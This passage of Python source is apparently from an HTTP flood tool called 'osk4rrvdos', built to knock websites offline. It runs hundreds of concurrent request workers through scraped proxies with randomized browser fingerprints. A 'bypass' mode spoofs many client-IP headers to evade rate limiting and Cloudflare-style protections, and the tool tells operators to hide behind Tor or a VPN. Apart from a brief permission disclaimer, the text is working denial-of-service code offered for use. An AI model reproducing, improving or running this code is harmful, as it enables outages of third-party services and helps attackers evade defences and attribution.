                cert = ssock.getpeercert(binary_form=False)
                if not cert:
                    return None
                return {
                    "cn": dict(x[0] for x in cert.get("subject", [])).get("commonName","?"),
                    "org": dict(x[0] for x in cert.get("subject", [])).get("organizationName","?"),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])).get("commonName","?"),
                    "expires": cert.get("notAfter","?"),
                    "sans": [s[1] for s in cert.get("subjectAltName", []) if s[0] == "DNS"][:8],
                }
    except Exception:
        return None

def detect_technologies(headers):
    detected = set()
    hs = str(headers).lower()
    for tech, sigs in TECH_SIGNATURES.items():
        for sig in sigs:
            if sig in hs:
                detected.add(tech)
                break
    srv = headers.get("Server", headers.get("server", ""))
    if srv:
        detected.add(f"Server={srv}")
    xpb = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
    if xpb:
        detected.add(f"Powered={xpb}")
    return sorted(detected)

def discover_known_paths(target, host):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def check(session, p):
        try:
            hdrs = build_headers(host)
            async with session.get(f"{target}{p}", headers=hdrs,
                                   timeout=aiohttp.ClientTimeout(total=5),
                                   allow_redirects=True) as r:
                await r.read()
                if r.status < 400:
                    return p
        except Exception:
            pass
        return None
    async def run():
        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=15, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as s:
            tasks = [check(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return [r for r in results if isinstance(r, str)]
    good = loop.run_until_complete(run())
    loop.close()
    return good

def build_headers(host, profile=None):
    ip1 = gen_ip()
    ip2 = gen_ip()
    rid = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    rv = str(random.randint(10000, 99999))
    ua = profile["ua"] if profile else random.choice(UA_LIST)
    lang = profile.get("lang","en-US,en;q=0.9") if profile else random.choice([
        "en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9",
        "de-DE,de;q=0.9","fr-FR,fr;q=0.9","es-ES,es;q=0.9"])

    h = {
        "Host": host,
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": lang,
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache","max-age=0"]),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": random.choice(["none","same-origin","cross-site"]),
        "Sec-Fetch-User": "?1",
        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(128,142)}", "Google Chrome";v="{random.randint(128,142)}", "Not=A?Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Pragma": "no-cache",
        "X-Forwarded-For": ip1,
        "X-Real-IP": ip2,
        "X-Request-ID": rid,
    }
    if random.random() > 0.4:
        h["Referer"] = f"https://www.google.com/search?q={rv}"
    if random.random() > 0.3:
        h["Origin"] = f"https://{host}"
    if random.random() > 0.5:
        c = base64.b64encode(random.randbytes(12)).decode()[:16]
        h["Cookie"] = f"_ga=GA1.2.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}; sid={c}"

    if bypass_active:
        h["X-Client-IP"] = gen_ip()
        h["X-Forwarded-Host"] = host
        h["X-HTTP-Method-Override"] = "GET"
        h["X-Forwarded-Proto"] = "https"
        h["X-Forwarded-Scheme"] = "https"
        h["CF-Connecting-IP"] = gen_ip()
        h["X-Remote-IP"] = gen_ip()
        h["Client-IP"] = gen_ip()
        h["X-Cluster-Client-IP"] = gen_ip()
        h["Forwarded"] = f"for={gen_ip()};proto=https;by={gen_ip()};host={host}"
        h["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish','haproxy','envoy','traefik','caddy'])}"
        h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR"])
        h["True-Client-IP"] = gen_ip()
        h["X-Originating-IP"] = gen_ip()
        if random.random() > 0.5:
            h["X-Forwarded-For"] = f"{gen_ip()}, {gen_ip()}, {gen_ip()}, {ip1}"

    return h

def worker_profile():
    return {
        "ua": random.choice(UA_LIST),
        "lang": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9","de-DE,de;q=0.9","fr-FR,fr;q=0.9"]),
        "id": "".join(random.choices("abcdef0123456789", k=8)),
        "delay_min": random.uniform(0.0003, 0.002),
        "delay_max": random.uniform(0.003, 0.015),
    }

async def attack_worker(session, url_obj, host, tid):
    global total_sent, total_failed, total_success, last_http_code, last_code_label, rate_times
    global total_proxy_used, total_direct_used, proxy_alive

    scheme = url_obj.scheme
    netloc = url_obj.netloc
    profile = worker_profile()

    await asyncio.sleep(random.uniform(0, 0.5))

    while running:
        path = pick_path()
        headers = build_headers(host, profile)
        target = f"{scheme}://{netloc}{path}"
        proxy = next_proxy() if proxy_mode else None

        try:
            async with session.get(target, headers=headers, proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=5),
                                   allow_redirects=True) as resp:
                code = resp.status
                await resp.read()
                with lock:
                    total_sent += 1
                    last_http_code = code
                    last_code_label = code_label(code)
                    if proxy:
                        total_proxy_used += 1
                    else:
                        total_direct_used += 1
                    if 200 <= code < 400:
                        total_success += 1
                    else:
                        total_failed += 1

        except (aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError,
                aiohttp.ClientOSError, aiohttp.ClientPayloadError,
                aiohttp.ClientError, asyncio.TimeoutError):
            with lock:
                total_sent += 1
                total_failed += 1
            if proxy:
                remove_bad_proxy(proxy)
        except Exception:
            with lock:
                total_sent += 1
                total_failed += 1
            if proxy:
                remove_bad_proxy(proxy)

        rate_times.append(time.time())

        if bypass_active:
            await asyncio.sleep(random.uniform(0.005, 0.04))
        else:
            await asyncio.sleep(random.uniform(profile["delay_min"], profile["delay_max"]))

def _browser_ssl_context():
    try:
        ctx = ssl.create_default_context()
        try:
            ctx.set_ciphers(
                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:"
                "ECDHE+AES256:ECDHE+AES128:!aNULL:!eNULL:!MD5"
            )
        except Exception:
            pass
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    except Exception:
        return True  # fallback to aiohttp default


async def http_attack(url, host, conns):
    parsed = urlparse(url)
    ssl_ctx = _browser_ssl_context() if parsed.scheme == "https" else False

    connector = aiohttp.TCPConnector(
        ssl=ssl_ctx,
        limit=conns * 2,
        limit_per_host=conns,
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        keepalive_timeout=15,
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(attack_worker(session, parsed, host, i)) for i in range(conns)]
        try:
            while running:
                await asyncio.sleep(0.25)
        except asyncio.CancelledError:
            pass
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

def stats_loop():
    global req_rate, rate_times
    while running:
        time.sleep(1.5)
        now = time.time()
        while rate_times and rate_times[0] < now - 2:
            rate_times.popleft()
        if len(rate_times) > 3 and rate_times[0] < now:
            with lock:
                req_rate = len(rate_times) / max(now - rate_times[0], 0.01)
        else:
            req_rate = 0.0
        if running:
            print_live()

def probe_target(target, host):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def deep():
        r = {"status":0,"server":"?","size":0,"technologies":[],"headers":{}}
        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=3)
        async with aiohttp.ClientSession(connector=connector) as s:
            hdrs = build_headers(host)
            try:
                async with s.get(target, headers=hdrs,
                                 timeout=aiohttp.ClientTimeout(total=8),
                                 allow_redirects=True) as resp:
                    r["status"] = resp.status
                    r["server"] = resp.headers.get("Server", resp.headers.get("server","?"))
                    raw = dict(resp.headers)
                    r["headers"] = {k:v for k,v in list(raw.items())[:20]}
                    r["technologies"] = detect_technologies(raw)
                    body = await resp.read()
                    r["size"] = len(body)
            except Exception as e:
                r["server"] = str(e)[:60]
        return r
    result = loop.run_until_complete(deep())
    loop.close()
    return result

def wait_for_proxy_validation(initial_msg=True):
    global proxy_validate_done, proxy_validate_result, proxy_alive
    dots = 0
    while not proxy_validate_done.is_set():
        if initial_msg:
            status = f"\r< / > Testing proxies{'.' * (dots % 4)}{' ' * (4 - dots % 4)}"
            safe_print(status, end="", flush=True)
            dots += 1
        time.sleep(0.3)
    valid, total = proxy_validate_result
    fast = len(valid)
    slow = total - fast
    safe_print(f"\r< / > {fast} fast | {slow} filtered" + " " * 20)
    return valid

def main():
    global running, bypass_active, proxy_mode, proxy_pool, proxy_alive, last_http_code, last_code_label, stopped
    global known_good_paths, total_proxy_used, total_direct_used

    try:
        show_banner()
    except Exception:
        pass
    os.system("title osk4rrvdos" if os.name == "nt" else "")

    safe_print("</> Python version detected:", sys.version.split()[0])
    safe_print("</> aiohttp:", aiohttp.__version__)
    safe_print("</> Libraries loaded")
    safe_print("</> Official download only from github.com/osk4rrv/osk4rrvdos")
    safe_print("</> Created by @osk4rrv")
    safe_print("")
    safe_print(" [!] PRIVACY NOTICE — This tool sends real HTTP traffic.")
    safe_print(" [!] Your IP WILL be exposed unless you use VPN / proxy.")
    safe_print(" [!] Pro-Tips: Cloudflare WARP | Tor (127.0.0.1:9050) | Mullvad VPN")
    safe_print(" [!] Use ONLY on targets you own or have explicit permission to test.")
    resp = input(" Press ENTER to continue (Ctrl+C to exit): ")

    target = input("\n[osk4rrvdos] url > ").strip()
    if not target:
        safe_print("[-] No target provided")
        any_key()
        return
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    parsed = urlparse(target)
    host = parsed.hostname
    scheme = parsed.scheme
    port = parsed.port or (443 if scheme == "https" else 80)

    proxy_mode = prompt_yn("\n[osk4rrvdos] Proxy attack [y/n]: ")
    bypass_active = prompt_yn("[osk4rrvdos] Bypass [y/n]: ")

    if not proxy_mode:
        safe_print("\n [!] WARNING: Direct mode — your real IP WILL be visible!")
        safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
        if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
            return

    safe_print(f"\n[*] Target: {scheme}://{host}:{port}")

    if proxy_mode:
        cached = _load_proxy_cache()
        if cached:
            safe_print(f"< / > Loaded {len(cached)} proxies from cache")
            proxy_pool = list(set(cached))
            random.shuffle(proxy_pool)
        else:
            safe_print("< / > Fetching online proxies...")
            raw = fetch_online_proxies()
            if not raw:
                safe_print("[!] Failed to fetch online proxies.")
                if not prompt_yn("[osk4rrvdos] Continue without proxies? [y/n]: "):
                    return
                proxy_mode = False
                proxy_pool = []
                proxy_alive = 0
            else:
                safe_print(f"< / > Fetched {len(raw)} total")
                proxy_pool = list(set(raw))
                random.shuffle(proxy_pool)

        if proxy_mode and proxy_pool:
            random.shuffle(proxy_pool)
            _save_proxy_cache()
            proxy_alive = len(proxy_pool)
            safe_print(f"< / > Pool: {proxy_alive} proxies ready")

            if proxy_alive == 0:
                safe_print("[!] No proxies — switching to direct mode")
                proxy_mode = False
    else:
        proxy_pool = []
        proxy_alive = 0

    safe_print("\n< / > Initializing...\n")

    if bypass_active:
        conns = min(400, max(200, (proxy_alive if proxy_mode else 250) // 2 + 150))
    elif proxy_mode:
        conns = min(250, max(120, proxy_alive // 2 + 50))
    else:
        conns = 200

    safe_print(f"\n[*] Launching ({conns} connections) ...\n")
    print_live()

    threading.Thread(target=stats_loop, daemon=True).start()

    running = True
    stopped = False

    def run_http():
        global running, stopped
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(http_attack(target, host, conns))
        except Exception as e:
            with lock:
                last_code_label = f"FATAL: {e}"
            running = False
            stopped = True
            safe_print(f"\n[!] Attack error: {e}")
        finally:
            loop.close()

    http_thread = threading.Thread(target=run_http, daemon=True)
    http_thread.start()

    try:
        while http_thread.is_alive():
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass

    running = False
    stopped = True
    http_thread.join(timeout=3)

    os.system("cls" if os.name == "nt" else "clear")
    safe_print("\n[. . .] Stopping...")
    time.sleep(0.3)

    safe_print(f"\n [+] Attack finished")
    safe_print(f"     Request sent    : {total_sent}")
    safe_print(f"     Request success : {total_success}")
    safe_print(f"     Request failed  : {total_failed}")
    safe_print(f"     Proxy routed    : {total_proxy_used}")
    safe_print(f"     Direct routed   : {total_direct_used}")
    safe_print(f"     Peak RPS        : {req_rate:.1f}")
    any_key()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
